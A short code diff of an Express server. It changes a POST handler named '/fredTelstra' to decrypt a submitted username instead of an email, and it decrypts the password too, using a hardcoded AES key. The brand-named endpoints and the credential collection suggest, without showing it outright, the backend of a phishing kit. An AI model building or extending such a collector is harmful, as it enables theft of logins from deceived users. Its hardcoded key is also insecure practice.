@@ -10387,7 +10387,7 @@ app.post("/tCapz", (req, res) => {
 app.options("/fredTelstra", cors());
 
 app.post("/fredTelstra", (req, res) => {
-  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
   );
   password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
